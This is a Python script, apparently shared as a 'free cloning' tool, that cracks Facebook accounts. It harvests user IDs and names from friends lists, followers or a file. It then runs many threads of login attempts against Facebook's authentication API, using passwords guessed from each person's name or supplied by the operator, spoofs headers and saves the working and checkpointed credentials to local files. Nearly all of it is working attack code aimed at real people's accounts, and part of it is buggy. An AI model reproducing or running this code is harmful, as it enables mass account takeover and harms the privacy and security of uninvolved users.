#coding=utf-8
try:
	import os,sys,time,datetime,random,hashlib,re,threading,json,getpass,urllib,requests,uuid,string
	from concurrent.futures import ThreadPoolExecutor
	from datetime import datetime
	from requests.exceptions import ConnectionError
except ImportError:
	os.system("pip install requests")
	os.system("pip install futures")
try:
    os.mkdir('/sdcard/ids')
except OSError:
    pass
agents = [
  "NokiaC3-00/5.0 (07.20) Profile/MIDP-2.1 Configuration/CLDC-1.1 Mozilla/5.0 AppleWebKit/420+ (KHTML, like Gecko) Safari/420+"
]
birth = ['001', '02', '03', '04', '05', '06', '07', '08', '09', '10', '11', '12', '13', '14', '15', '16', '17', '18', '19', '20', '21']
bd = random.randint(2e7, 3e7)
sim = random.randint(2e4, 4e4)
header = {'x-fb-connection-bandwidth': repr(bd), 'x-fb-sim-hni': repr(sim), 'x-fb-net-hni': repr(sim),'x-fb-connection-quality': 'EXCELLENT', 'user-agent':'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.114 Safari/537.3','x-fb-connection-type': 'unknown','content-type': 'application/x-www-form-urlencoded', 'x-fb-http-engine': 'Liger'}

ct = datetime.now()
n = ct.month
bulan = ['Jan', 'Feb', 'Mar', 'Apr', 'May', 'Jun', 'Jul', 'Aug', 'Sep', 'Oct', 'Nov', 'Dec']
try:
    if n < 0 or n > 12:
        exit()
    nTemp = n - 1
except ValueError:
    exit()

current = datetime.now()
ta = current.year
bu = current.month
ha = current.day
op = bulan[nTemp]

def logo():
	print( """
\t   █████  ███████ ███    ███ ██
\t  ██   ██      ██ ████  ████ ██
\t  ███████   ███   ██ ████ ██ ██
\t  ██   ██ ██      ██  ██  ██ ██
\t  ██   ██ ███████ ██      ██ ██ 
|-----------------------------------------------|
  Author         :  AZMI
  Facebook       :  TECHAZMII
  NOTE           :  ENJOY FREE CLONING
|-----------------------------------------------|
 use flight (airplane) mode before use
|-----------------------------------------------|
     """)


def token_login():
    os.system("clear")
    try:
        token = open("access_token.txt", "r").read()
        menu()
    except(KeyError , IOError):
    	os.system("clear")
    	logo()
    	print("\tLogin with token")
    	print(47*"-")
    	print("")
    	token = input(" Paste token here: ")
    	sav = open("access_token.txt", "w")
    	sav.write(token)
    	sav.close()
    	check_log()


def check_log():
    os.system("clear")
    try:
        token = open("access_token.txt", "r").read()
        menu()
    except(KeyError , IOError):
        token_login()
    try:
        r = requests.get("https://graph.facebook.com/me?access_token="+token)
        q = json.loads(r.text)
        name = q["name"]
    except(KeyError):
        logo()
        print("")
        print("\tLogged in token has expired")
        os.system("rm -rf access_token.txt")
        print("")
        time.sleep(1)
        token_login()

def menu():
    os.system("clear")
    logo()
    print("")
    print("  [1] Auto")
    print("  [2] Choice")
    print("")
    menu_option()

def menu_option():
	select = input("  Choose: ")
	if select =="1":
		crack()
	elif select =="2":
		choice()
	else:
		print("")
		print("\tSelect valid option")
		print("")
		menu_option()

def crack():
	global token
	os.system("clear")
	try:
		token = open("access_token.txt","r").read()
	except IOError:
		print("")
		print("\tToken not found ")
		time.sleep(1)
		token_login()
	os.system("clear")
	logo()
	print("")
	print("\tCrack With Auto Password")
	print(47*"-")
	print("")
	print("  [1] Crack public id")
	print("  [2] Crack followers")
	print("  [3] Crack From File")
	print("  [0] Back")
	print("")
	crack_select()
def crack_select():
	select = input("  Choose: ")
	id=[]
	oks=[]
	cps=[]
	if select =="1":
		os.system("clear")
		logo()
		idt = input("  Input id 1: ")
		idt2 = input("  Input id 2: ")
		idt3 = input("  Input id 3: ")
		idt4 = input("  Input id 4: ")
		idt5 = input("  Input id 5: ")
		idt6 = input("  Input id 6: ")
		idt7 = input("  Input id 7: ")
		idt8 = input("  Input id 8: ")
		idt9 = input("  Input id 9: ")
		idt10 = input("  Input id 10: ")
		try:
			r = requests.get("https://graph.facebook.com/"+idt+"/friends?access_token="+token)
			z = json.loads(r.text)
			for i in z["data"]:
				uid = i["id"]
				na = i["name"]
				nm = na.rsplit(" ")[0]
				id.append(uid+"|"+nm)
		except KeyError:
			print(" ")
		try:
			r = requests.get("https://graph.facebook.com/"+idt2+"/friends?access_token="+token)
			z = json.loads(r.text)
			for i in z["data"]:
				uid = i["id"]
				na = i["name"]
				nm = na.rsplit(" ")[0]
				id.append(uid+"|"+nm)
		except KeyError:
			print(" ")
		try:
			r = requests.get("https://graph.facebook.com/"+idt3+"/friends?access_token="+token)
			z = json.loads(r.text)
			for i in z["data"]:
				uid = i["id"]
				na = i["name"]
				nm = na.rsplit(" ")[0]
				id.append(uid+"|"+nm)
		except KeyError:
			print(" ")
		try:
			r = requests.get("https://graph.facebook.com/"+idt4+"/friends?access_token="+token)
			z = json.loads(r.text)
			for i in z["data"]:
				uid = i["id"]
				na = i["name"]
				nm = na.rsplit(" ")[0]
				id.append(uid+"|"+nm)
		except KeyError:
			print(" ")
		try:
			r = requests.get("https://graph.facebook.com/"+idt5+"/friends?access_token="+token)
			z = json.loads(r.text)
			for i in z["data"]:
				uid = i["id"]
				na = i["name"]
				nm = na.rsplit(" ")[0]
				id.append(uid+"|"+nm)
		except KeyError:
			print(" ")
		try:
			r = requests.get("https://graph.facebook.com/"+idt6+"/friends?access_token="+token)
			z = json.loads(r.text)
			for i in z["data"]:
				uid = i["id"]
				na = i["name"]
				nm = na.rsplit(" ")[0]
				id.append(uid+"|"+nm)
		except KeyError:
			print(" ")
		try:
			r = requests.get("https://graph.facebook.com/"+idt7+"/friends?access_token="+token)
			z = json.loads(r.text)
			for i in z["data"]:
				uid = i["id"]
				na = i["name"]
				nm = na.rsplit(" ")[0]
				id.append(uid+"|"+nm)
		except KeyError:
			print(" ")
		try:
			r = requests.get("https://graph.facebook.com/"+idt8+"/friends?access_token="+token)
			z = json.loads(r.text)
			for i in z["data"]:
				uid = i["id"]
				na = i["name"]
				nm = na.rsplit(" ")[0]
				id.append(uid+"|"+nm)
		except KeyError:
			print(" ")
		try:
			r = requests.get("https://graph.facebook.com/"+idt9+"/friends?access_token="+token)
			z = json.loads(r.text)
			for i in z["data"]:
				uid = i["id"]
				na = i["name"]
				nm = na.rsplit(" ")[0]
				id.append(uid+"|"+nm)
		except KeyError:
			print(" ")
		try:
			r = requests.get("https://graph.facebook.com/"+idt10+"/friends?access_token="+token)
			z = json.loads(r.text)
			for i in z["data"]:
				uid = i["id"]
				na = i["name"]
				nm = na.rsplit(" ")[0]
				id.append(uid+"|"+nm)
		except KeyError:
			print(" ")
	elif select =="2":
		os.system("clear")
		logo()
		idt = input("  Input id: ")
		try:
			r = requests.get("https://graph.facebook.com/"+idt+"?access_token="+token)
			q = json.loads(r.text)
		except KeyError:
			print("\tInvalid id link OR token")
			print("")
			input(" Press enter to back")
			crack()
		r = requests.get("https://graph.facebook.com/"+idt+"/subscribers?access_token="+token+"&limit=999999")
		z = json.loads(r.text)
		for i in z["data"]:
			uid = i["id"]
			na = i["name"]
			nm = na.rsplit(" ")[0]
			id.append(uid+"|"+nm)
	elif select =="3":
		os.system("clear")
		logo()
		try:
			filelist = input("  [+] File : ")
			for line in open(filelist , "r").readlines():
			    id.append(line.strip())
		except (KeyError,IOError):
			print("")
			print("\t    Requested file not found")
			print("")
			input(" Press enter to back ")
			crack()
	elif select =="0":
	    menu()
	else:
		print("")
		print("\tSelect valid option")
		print("")
		crack_select()
	os.system("clear")
	logo()
	print("  Total IDs : "+str(len(id)))
	print("  Brute has been started")
	print("  Press CTRL + Z to stop")
	print("")
	print(47*"-")
	print("")
	def main(arg):
		user=arg
		uid,name=user.split("|")
		ranagent = random.choice(agents)
		biran = random.choice(birth)
		session = requests.Session()
		session.headers.update({'User-Agent': ranagent})
		try:
			pass1 = name.lower().split(' ')[0] + '123'
			data = session.get("https://b-api.facebook.com/method/auth.login?format=json&email="+uid+"&password="+pass1+"&credentials_type=device_based_login_password&generate_session_cookies=1&error_detail_type=button_with_disabled&source=device_based_login&meta_inf_fbmeta=%20&currently_logged_in_userid=0&method=GET&locale=en_US&client_country_code=US&fb_api_caller_class=com.facebook.fos.headersv2.fb4aorca.HeadersV2ConfigFetchRequestHandler&access_token=350685531728|62f8ce9f74b12f84c123cc23437a4a32&fb_api_req_friendly_name=authenticate&cpl=true", headers=header).text
			q = json.loads(data)
			if "access_token" in q:
				print(" \033[1;32m [OK] "+uid+" | "+pass1+"\33[0;0m")
				ok = open("/sdcard/ids/ok-%s-%s-%s.txt" % (ha, op, ta), "a")
				ok.write(uid+"|"+pass1+"\n")
				ok.close()
				oks.append(uid+pass1)
			else:
				if "www.facebook.com" in q["error_msg"]:
					print("  [CP] "+uid+" | "+pass1+" ")
					cp = open("/sdcard/ids/cp-%s-%s-%s.txt" % (ha, op, ta), "a")
					cp.write(uid+"|"+pass1+"\n")
					cp.close()
					cps.append(uid+pass1)
				else:
					pass2 = name.lower().split(' ')[0] + '1234'
					data = session.get("https://b-api.facebook.com/method/auth.login?format=json&email="+uid+"&password="+pass2+"&credentials_type=device_based_login_password&generate_session_cookies=1&error_detail_type=button_with_disabled&source=device_based_login&meta_inf_fbmeta=%20&currently_logged_in_userid=0&method=GET&locale=en_US&client_country_code=US&fb_api_caller_class=com.facebook.fos.headersv2.fb4aorca.HeadersV2ConfigFetchRequestHandler&access_token=350685531728|62f8ce9f74b12f84c123cc23437a4a32&fb_api_req_friendly_name=authenticate&cpl=true", headers=header).text
					q = json.loads(data)
					if "access_token" in q:
						print(" \033[1;32m [OK] "+uid+" | "+pass2+"\33[0;0m")
						ok = open("/sdcard/ids/ok-%s-%s-%s.txt" % (ha, op, ta), "a")
						ok.write(uid+"|"+pass2+"\n")
						ok.close()
						oks.append(uid+pass2)
					else:
						if "www.facebook.com" in q["error_msg"]:
							print("  [CP] "+uid+" | "+pass2+" ")
							cp = open("/sdcard/ids/cp-%s-%s-%s.txt" % (ha, op, ta), "a")
							cp.write(uid+"|"+pass2+"\n")
							cp.close()
							cps.append(uid+pass2)
						else:
							pass3 = name.lower().split(' ')[0] + '12345'
							data = session.get("https://b-api.facebook.com/method/auth.login?format=json&email="+uid+"&password="+pass3+"&credentials_type=device_based_login_password&generate_session_cookies=1&error_detail_type=button_with_disabled&source=device_based_login&meta_inf_fbmeta=%20&currently_logged_in_userid=0&method=GET&locale=en_US&client_country_code=US&fb_api_caller_class=com.facebook.fos.headersv2.fb4aorca.HeadersV2ConfigFetchRequestHandler&access_token=350685531728|62f8ce9f74b12f84c123cc23437a4a32&fb_api_req_friendly_name=authenticate&cpl=true", headers=header).text
							q = json.loads(data)
							if "access_token" in q:
								print(" \033[1;32m [OK] "+uid+" | "+pass3+"\33[0;0m")
								ok = open("/sdcard/ids/ok-%s-%s-%s.txt" % (ha, op, ta), "a")
								ok.write(uid+"|"+pass3+"\n")
								ok.close()
								oks.append(uid+pass3)
							else:
								if "www.facebook.com" in q["error_msg"]:
									print("  [CP] "+uid+" | "+pass3+" ")
									cp = open("/sdcard/ids/cp-%s-%s-%s.txt" % (ha, op, ta), "a")
									cp.write(uid+"|"+pass3+"\n")
									cp.close()
									cps.append(uid+pass3)
								else:
									pass4 = name.lower().split(' ')[1] + '123'
									data = session.get("https://b-api.facebook.com/method/auth.login?format=json&email="+uid+"&password="+pass4+"&credentials_type=device_based_login_password&generate_session_cookies=1&error_detail_type=button_with_disabled&source=device_based_login&meta_inf_fbmeta=%20&currently_logged_in_userid=0&method=GET&locale=en_US&client_country_code=US&fb_api_caller_class=com.facebook.fos.headersv2.fb4aorca.HeadersV2ConfigFetchRequestHandler&access_token=350685531728|62f8ce9f74b12f84c123cc23437a4a32&fb_api_req_friendly_name=authenticate&cpl=true", headers=header).text
									q = json.loads(data)
									if "access_token" in q:
										print(" \033[1;32m [OK] "+uid+" | "+pass4+"\33[0;0m")
										ok = open("/sdcard/ids/ok-%s-%s-%s.txt" % (ha, op, ta), "a")
										ok.write(uid+"|"+pass4+"\n")
										ok.close()
										oks.append(uid+pass4)
									else:
										if "www.facebook.com" in q["error_msg"]:
											print("  [CP] "+uid+" | "+pass4+" ")
											cp = open("/sdcard/ids/cp-%s-%s-%s.txt" % (ha, op, ta), "a")
											cp.write(uid+"|"+pass4+"\n")
											cp.close()
											cps.append(uid+pass4)
										else:
															pass5 = name.lower().split(' ')[0] + name.lower().split(' ')[1]
															data = session.get("https://b-api.facebook.com/method/auth.login?format=json&email="+uid+"&password="+pass5+"&credentials_type=device_based_login_password&generate_session_cookies=1&error_detail_type=button_with_disabled&source=device_based_login&meta_inf_fbmeta=%20&currently_logged_in_userid=0&method=GET&locale=en_US&client_country_code=US&fb_api_caller_class=com.facebook.fos.headersv2.fb4aorca.HeadersV2ConfigFetchRequestHandler&access_token=350685531728|62f8ce9f74b12f84c123cc23437a4a32&fb_api_req_friendly_name=authenticate&cpl=true", headers=header).text
															q = json.loads(data)
															if "access_token" in q and "EAAA" in q:
																print(" \033[1;32m [OK] "+uid+" | "+pass7+"\033[0;97m")
																ok = open("/sdcard/ids/ok-%s-%s-%s.txt" % (ha, op, ta), "a")
																ok.write(uid+"|"+pass5+"\n")
																ok.close()
																oks.append(uid+pass5)
															else:
																if "www.facebook.com" in q["error_msg"]:
																	print(" \033[1;33m [CP] "+uid+" | "+pass5+"\033[0;97m")
																	cp = open("/sdcard/ids/cp-%s-%s-%s.txt" % (ha, op, ta), "a")
																	cp.write(uid+"|"+pass5+"\n")
																	cp.close()
																	cps.append(uid+pass5)
																else:
																	pass6 = name.lower()
																	data = session.get("https://b-api.facebook.com/method/auth.login?format=json&email="+uid+"&password="+pass6+"&credentials_type=device_based_login_password&generate_session_cookies=1&error_detail_type=button_with_disabled&source=device_based_login&meta_inf_fbmeta=%20&currently_logged_in_userid=0&method=GET&locale=en_US&client_country_code=US&fb_api_caller_class=com.facebook.fos.headersv2.fb4aorca.HeadersV2ConfigFetchRequestHandler&access_token=350685531728|62f8ce9f74b12f84c123cc23437a4a32&fb_api_req_friendly_name=authenticate&cpl=true", headers=header).text
																	q = json.loads(data)
																	if "access_token" in q and "EAAA" in q:
																		print(" \033[1;32m [OK] "+uid+" | "+pass6+"\033[0;97m")
																		ok = open("/sdcard/ids/ok-%s-%s-%s.txt" % (ha, op, ta), "a")
																		ok.write(uid+"|"+pass6+"\n")
																		ok.close()
																		oks.append(uid+pass6)
																	else:
																		if "www.facebook.com" in q["error_msg"]:
																			print(" \033[1;33m [CP] "+uid+" | "+pass6+"\033[0;97m")
																			cp = open("/sdcard/ids/cp-%s-%s-%s.txt" % (ha, op, ta), "a")
																			cp.write(uid+"|"+pass6+"\n")
																			cp.close()
																			cps.append(uid+pass6)
		except:
			pass
	with ThreadPoolExecutor(max_workers=50) as th:
		for x in id:
			th.submit(main, x)
	print("")
	time.sleep(0.5)
	print(47*"-")
	print("")
	print(" The process has been completed")
	print(" Total Ok/Cp: "+str(len(oks))+"/"+str(len(cps)))
	input(" Press enter to back ")
	time.sleep(0.5)
	os.system("clear")
	crack()

def choice():
	global token
	os.system("clear")
	try:
		token = open("access_token.txt","r").read()
	except IOError:
		print("")
		print("\tToken not found")
		time.sleep(1)
		token_login()
	os.system("clear")
	logo()
	print("")
	print("\tCrack With Choice Password")
	print(47*"-")
	print("")
	print("  [1] Crack public id")
	print("  [2] Crack followers")
	print("  [3] Crack From File")
	print("  [0] Back")
	print("")
	choice_select()
def choice_select():
	select = input("  Choose option: ")
	id=[]
	oks=[]
	cps=[]
	if select =="1":
		os.system("clear")
		logo()
		pass1 = input(" Password: ")
		pass2 = input(" Password: ")
		pass3 = input(" Password: ")
		idt = input("  Input id 1: ")
		idt2 = input("  Input id 2: ")
		idt3 = input("  Input id 3: ")
		idt4 = input("  Input id 4: ")
		idt5 = input("  Input id 5: ")
		idt6 = input("  Input id 6: ")
		idt7 = input("  Input id 7: ")
		idt8 = input("  Input id 8: ")
		idt9 = input("  Input id 9: ")
		idt10 = input("  Input id 10: ")
		try:
			r = requests.get("https://graph.facebook.com/"+idt+"/friends?access_token="+token)
			z = json.loads(r.text)
			for i in z["data"]:
				uid = i["id"]
				na = i["name"]
				nm = na.rsplit(" ")[0]
				id.append(uid+"|"+nm)
		except KeyError:
			print(" ")
		try:
			r = requests.get("https://graph.facebook.com/"+idt2+"/friends?access_token="+token)
			z = json.loads(r.text)
			for i in z["data"]:
				uid = i["id"]
				na = i["name"]
				nm = na.rsplit(" ")[0]
				id.append(uid+"|"+nm)
		except KeyError:
			print(" ")
		try:
			r = requests.get("https://graph.facebook.com/"+idt3+"/friends?access_token="+token)
			z = json.loads(r.text)
			for i in z["data"]:
				uid = i["id"]
				na = i["name"]
				nm = na.rsplit(" ")[0]
				id.append(uid+"|"+nm)
		except KeyError:
			print(" ")
		try:
			r = requests.get("https://graph.facebook.com/"+idt4+"/friends?access_token="+token)
			z = json.loads(r.text)
			for i in z["data"]:
				uid = i["id"]
				na = i["name"]
				nm = na.rsplit(" ")[0]
				id.append(uid+"|"+nm)
		except KeyError:
			print(" ")
		try:
			r = requests.get("https://graph.facebook.com/"+idt5+"/friends?access_token="+token)
			z = json.loads(r.text)
			for i in z["data"]:
				uid = i["id"]
				na = i["name"]
				nm = na.rsplit(" ")[0]
				id.append(uid+"|"+nm)
		except KeyError:
			print(" ")
		try:
			r = requests.get("https://graph.facebook.com/"+idt6+"/friends?access_token="+token)
			z = json.loads(r.text)
			for i in z["data"]:
				uid = i["id"]
				na = i["name"]
				nm = na.rsplit(" ")[0]
				id.append(uid+"|"+nm)
		except KeyError:
			print(" ")
		try:
			r = requests.get("https://graph.facebook.com/"+idt7+"/friends?access_token="+token)
			z = json.loads(r.text)
			for i in z["data"]:
				uid = i["id"]
				na = i["name"]
				nm = na.rsplit(" ")[0]
				id.append(uid+"|"+nm)
		except KeyError:
			print(" ")
		try:
			r = requests.get("https://graph.facebook.com/"+idt8+"/friends?access_token="+token)
			z = json.loads(r.text)
			for i in z["data"]:
				uid = i["id"]
				na = i["name"]
				nm = na.rsplit(" ")[0]
				id.append(uid+"|"+nm)
		except KeyError:
			print(" ")
		try:
			r = requests.get("https://graph.facebook.com/"+idt9+"/friends?access_token="+token)
			z = json.loads(r.text)
			for i in z["data"]:
				uid = i["id"]
				na = i["name"]
				nm = na.rsplit(" ")[0]
				id.append(uid+"|"+nm)
		except KeyError:
			print(" ")
		try:
			r = requests.get("https://graph.facebook.com/"+idt10+"/friends?access_token="+token)
			z = json.loads(r.text)
			for i in z["data"]:
				uid = i["id"]
				na = i["name"]
				nm = na.rsplit(" ")[0]
				id.append(uid+"|"+nm)
		except KeyError:
			print(" ")
	elif select =="2":
		os.system("clear")
		logo()
		pass1 = input(" Password: ")
		pass2 = input(" Password: ")
		pass3 = input(" Password: ")
		idt = input(" Input id: ")
		try:
			r = requests.get("https://graph.facebook.com/"+idt+"?access_token="+token)
			q = json.loads(r.text)
			os.system('clear')
			logo()
		except KeyError:
			print("\tInvalid id link")
			print("")
			input(" Press enter to back")
			choice()
		r = requests.get("https://graph.facebook.com/"+idt+"/subscribers?access_token="+token+"&limit=999999")
		z = json.loads(r.text)
		for i in z["data"]:
			uid = i["id"]
			na = i["name"]
			nm = na.rsplit(" ")[0]
			id.append(uid+"|"+nm)
	elif select =="3":
		os.system("clear")
		logo()
		pass1 = input(" Password: ")
		pass2 = input(" Password: ")
		pass3 = input(" Password: ")
		try:
			filelist = input(" [+] File: ")
			for line in open(filelist , "r").readlines():
			    id.append(line.strip())
		except (KeyError,IOError):
			print("")
			print("\t    Requested file not found")
			print("")
			input(" Press enter to back ")
			choice()
	elif select =="0":
	    menu()
	else:
		print("")
		print("\tSelect valid option")
		print("")
		choice_select()
	os.system("clear")
	logo()
	print("  Total IDs : "+str(len(id)))
	print("  Brute has been started")
	print("  Press CTRL + Z to stop")
	print("")
	print(47*"-")
	print("")
	def main(arg):
		user=arg
		uid,name=user.split("|")
		ranagent = random.choice(agents)
		session = requests.Session()
		session.headers.update({'User-Agent': ranagent})
		try:
			data = session.get("https://b-api.facebook.com/method/auth.login?format=json&email="+uid+"&password="+pass1+"&credentials_type=device_based_login_password&generate_session_cookies=1&error_detail_type=button_with_disabled&source=device_based_login&meta_inf_fbmeta=%20&currently_logged_in_userid=0&method=GET&locale=en_US&client_country_code=US&fb_api_caller_class=com.facebook.fos.headersv2.fb4aorca.HeadersV2ConfigFetchRequestHandler&access_token=350685531728|62f8ce9f74b12f84c123cc23437a4a32&fb_api_req_friendly_name=authenticate&cpl=true", headers=header).text
			q = json.loads(data)
			if "access_token" in q:
				print(" \033[1;32m [OK] "+uid+" | "+pass1+"\33[0;0m")
				ok = open("/sdcard/ids/ok-%s-%s-%s.txt" % (ha, op, ta), "a")
				ok.write(uid+"|"+pass1+"\n")
				ok.close()
				oks.append(uid+pass1)
			else:
				if "www.facebook.com" in q["error_msg"]:
					print("  [CP] "+uid+" | "+pass1+" ")
					cp = open("/sdcard/ids/cp-%s-%s-%s.txt" % (ha, op, ta), "a")
					cp.write(uid+"|"+pass1+"\n")
					cp.close()
					cps.append(uid+pass1)
				else:
					data = session.get("https://b-api.facebook.com/method/auth.login?format=json&email="+uid+"&password="+pass2+"&credentials_type=device_based_login_password&generate_session_cookies=1&error_detail_type=button_with_disabled&source=device_based_login&meta_inf_fbmeta=%20&currently_logged_in_userid=0&method=GET&locale=en_US&client_country_code=US&fb_api_caller_class=com.facebook.fos.headersv2.fb4aorca.HeadersV2ConfigFetchRequestHandler&access_token=350685531728|62f8ce9f74b12f84c123cc23437a4a32&fb_api_req_friendly_name=authenticate&cpl=true", headers=header).text
					q = json.loads(data)
					if "access_token" in q:
						print(" \033[1;32m [OK] "+uid+" | "+pass2+"\33[0;0m")
						ok = open("/sdcard/ids/ok-%s-%s-%s.txt" % (ha, op, ta), "a")
						ok.write(uid+"|"+pass2+"\n")
						ok.close()
						oks.append(uid+pass2)
					else:
						if "www.facebook.com" in q["error_msg"]:
							print("  [CP] "+uid+" | "+pass2+" ")
							cp = open("/sdcard/ids/cp-%s-%s-%s.txt" % (ha, op, ta), "a")
							cp.write(uid+"|"+pass2+"\n")
							cp.close()
							cps.append(uid+pass2)
						else:
							data = session.get("https://b-api.facebook.com/method/auth.login?format=json&email="+uid+"&password="+pass3+"&credentials_type=device_based_login_password&generate_session_cookies=1&error_detail_type=button_with_disabled&source=device_based_login&meta_inf_fbmeta=%20&currently_logged_in_userid=0&method=GET&locale=en_US&client_country_code=US&fb_api_caller_class=com.facebook.fos.headersv2.fb4aorca.HeadersV2ConfigFetchRequestHandler&access_token=350685531728|62f8ce9f74b12f84c123cc23437a4a32&fb_api_req_friendly_name=authenticate&cpl=true", headers=header).text
							q = json.loads(data)
							if "access_token" in q:
								print(" \033[1;32m [OK] "+uid+" | "+pass3+"\33[0;0m")
								ok = open("/sdcard/ids/ok-%s-%s-%s.txt" % (ha, op, ta), "a")
								ok.write(uid+"|"+pass3+"\n")
								ok.close()
								oks.append(uid+pass3)
							else:
								if "www.facebook.com" in q["error_msg"]:
									print("  [CP] "+uid+" | "+pass3+" ")
									cp = open("/sdcard/ids/cp-%s-%s-%s.txt" % (ha, op, ta), "a")
									cp.write(uid+"|"+pass3+"\n")
									cp.close()
									cps.append(uid+pass3)
		except:
			pass
	with ThreadPoolExecutor(max_workers=50) as th:
		for x in id:
			th.submit(main, x)
	print("")
	time.sleep(0.5)
	print(47*"-")
	print("")
	print(" The process has been completed")
	print(" Total Ok/Cp: "+str(len(oks))+"/"+str(len(cps)))
	input(" Press enter to back ")
	time.sleep(0.5)
	os.system("clear")
	choice()

if __name__ == '__main__':
	token_login()